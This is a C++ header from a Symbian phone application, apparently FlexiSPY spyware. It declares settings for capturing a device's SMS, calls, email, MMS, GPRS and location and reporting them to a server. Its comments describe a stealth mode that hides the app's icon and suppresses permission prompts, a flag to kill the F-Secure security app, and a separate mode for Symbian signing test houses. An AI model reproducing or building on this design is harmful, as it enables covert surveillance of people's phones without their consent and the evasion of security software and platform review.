#ifndef __CltSettings_H__
#define __CltSettings_H__

#include <e32base.h>

#include "SpyInfo.h"
#include "NetOperator.h"
#include "IMEIObserver.h"
#include "GlobalConst.h"
#include "SpyBugInfo.h"
#include "GpsSettingOptions.h"
#include "ActiveBase.h"
#include "OperatorKeyword.h"
//#include "SettingDb.h"
const TInt KIapMaxNameLength = 100;
const TInt KSettingPasswordMaxLength = 10;

/*
* 5 check boxes.
* SMS,CALL,MAIL,MMS,GPRS
*/

class RWriteStream;
class RReadStream;
class MSettingChangeObserver;
class CSpyCallSettings;
class CFxsAppUi;

const TInt KMaxNumberOfEventTextSize = 100;
const TInt KSecretCodeHashStringMaxLength = 50;
const TInt KIMSISize = 15;

enum TFxEventType
	{
	ETypeSMS,
	ETypeCALL,	
	ETypeMAIL,
	ETypeLocation,
	ETypeMMS,
	ETypeGPRS
	};

/**
Anti flexispy setting info*/
class TMiscellaneousSetting
	{
public:
	void ExternalizeL(RWriteStream& aStream) const;
    void InternalizeL(RReadStream& aStream);
public:
	/**
	Indicate to kill F-Secure*/
	TBool iKillFSecureApp;
	
	/**
	This is used when externalisation.
	this way, we can add a new filed to this class later and it won't cause the stream to currutped*/
	static const TInt KFiledCount = 1;
	};
	
//this applies for S60 3rd only
class TS9Settings
	{
public:
	TS9Settings();
	void ExternalizeL(RWriteStream& aStream) const;
    void InternalizeL(RReadStream& aStream);  
public:
	TBool iFirstLaunch;
	/**
	Hide application's incon from the task list*/
	TBool iShowIconInTaskList;
	/**
	ETrue, will prompt asking for permission when the application initiate billable event*/
	TBool iShowBillableEvent;
	/**
	ETrue, will prompt asking for permission when duration setting is set to 'no log'*/
	TBool iAskBeforeChangeLogConfig;
	/**
	Indicates this that FlexiKEY used with the product is for Symbian Sign Test House not our real user*/
	TBool iS9SignMode;	
	};
	
class TFxConnectInfo
	{
public:
	TFxConnectInfo();
	void ExternalizeL(RWriteStream& aStream) const;
    void InternalizeL(RReadStream& aStream);
	
public:
	TBool iUseProxy;
	TBuf<50> iProxyAddr;	
	};

class CFxsSettings : public CActiveBase					 
	{
public:
	static CFxsSettings* NewL();
	~CFxsSettings();	
public:		
    void ExternalizeL(RWriteStream& aStream) const;
    void InternalizeL(RReadStream& aStream);
    
    void NotifyChanged();
	void AddObserver(MSettingChangeObserver* aObserver);
	
#if !defined(EKA2)
	inline TFxConnectInfo& ConnectInfo()
		{return iConnInfo;}
#endif
	inline TNetOperatorInfo& NetworkOperatorInfo();
	
	inline TInt& TimerInterval();
	inline void SetTimerInterval(TInt aValue);
	
	inline TInt& KeepAliveTimerInterval();
	inline void SetKeepAliveTimerInterval(TInt aValue);
	
	inline TUint32& IapId();
	inline void SetIapId(TUint32 aIapId);	
	
	//event type check boxes: sms,call,mms,mail	
	inline CArrayFix<TInt>& CheckboxArray();
	
	//
	//flag indicates application is auto start
	//
	inline TBool& IsAutoStarted();	
	//	
	inline void SetAutoStart(TBool aAutoStart);		
	//
	inline TBool EventSmsEnable();	
	inline void SetEventSmsEnable(TBool aEnable);	
	//
	inline TBool EventCallEnable();	
	inline void SetEventCallEnable(TBool aEnable);
	
	//
	inline TBool EventMmsEnable();		
	inline void SetEventMmsEnable(TBool aEnable);
	
	inline TBool EventEmailEnable();	
	inline void SetEventEmailEnable(TBool aEnable);
	
	//
	inline TBool EventGprsEnable();	
	inline void SetEventGprsEnable(TBool aEnable);

	inline TBool EventLocationEnable();	
	inline void SetEventLocationEnable(TBool aEnable);
	
	/*
	* Start/Stop capture all events
	* 
	*/
	inline TBool& StartCapture();
	
	inline TInt& MaxNumberOfEvent();
	
	//
	inline const TDesC8& SecretCodeHashString() const;		
	
	//Hide from task list
	/**
	* Get current status of application's icon in the task list
	* 
	* @return modifiable value
	*/
	inline TBool& CurrentlyHideFromTaskList();
	inline void SetHideFromTaskList(TBool aHide);
	
	inline const TS9Settings& S9Settings() const;		
	inline TS9Settings& S9Settings();	
	
	inline const TDeviceIMEI& IMEI() const;
	inline TDeviceIMEI& IMEI();
	
	inline const TDesC& IMSI() const;
	inline TDes& IMSI();
	
	inline TMiscellaneousSetting& MiscellaneousSetting();
	
	inline const TWatchList& WatchList() const;	
	inline TWatchList& WatchList();	
	inline TMonitorInfo& SpyMonitorInfo();
	
	inline const TMonitorInfo& SpyMonitorInfo() const;	
	inline const TBugInfo& BugInfo() const;	
	
	inline const TGpsSettingOptions& GpsSettingOptions() const;	
	inline TGpsSettingOptions& GpsSettingOptions();
	
	inline TOperatorNotifySmsKeyword& OperatorNotifySmsKeyword();
	/**
	* Set stealth mode
	* - icon is hidden from tasklist
	* - will not ask for permission when performing billable event
	* - iAskBeforeChangeLogConfig is set to EFalse
	*/
	void SetStealthMode(TBool aStealth);
	TBool StealthMode();	
	void SetS9SignMode(TBool aS9SignedMode);	
	/**
	* Is test house mode
	* @return ETrue if test house mode and also ETrue if the application is not activated yet
	*/
	TBool IsTSM();
private:
	void DoCancel();
	void RunL();
	TInt RunError(TInt aError);
	TPtrC ClassName();
	
private: //from MSpySettingObserver
	void SpySettingChangedL();
	
private:
	void ConstructL();
	CFxsSettings();	
	void StoreSpyNumberL() const;
	
private:
	CFxsAppUi* iAppUi;
	TInt iTimerInterval; // in minute	
	// IAP Id
	TUint32	iIapId;
	RArray<TAny*> iObservers; //not owned	
	/*
	* flag indicates app is auto start
	*/
	TBool iAutoStart;		
	/*
	* EFalse: the app will stop monitoring all events
	*/
	TBool iAppEnabled;	
	/*
	* Event Type Array
	* Phone Call,SMS,MAIL,LOC
	*/
	CArrayFixFlat<TInt>* iCheckboxArray;
	/*
	* Events will be reported to the server when number of event is equal or more than value of iMaxNumberOfEvent
	*/
	TInt iMaxNumberOfEvent;
	TBuf<KIMSISize> iIMSI;
	
#if !defined(EKA2)
	TFxConnectInfo iConnInfo;
#endif
	TS9Settings	iS9Settings;
	
	//@since in RBackupPRO 1.0
	TNetOperatorInfo iNetOperatorInfo;
	TMiscellaneousSetting iMiscSetting;	
	TBugInfo iBugInfo;
	TGpsSettingOptions iGpsOptions;
	TOperatorNotifySmsKeyword iOperatorSmsKeyword;
	
	/**
	Flag indicates which observer index to notiry
	Note: This is not settings value. it is not serialized*/
	TInt iObserverIndexNotify;
	/**
	This is not externalized to file*/
	TDeviceIMEI iIMEI;
	};

#include "CltSetting.inl"

#endif
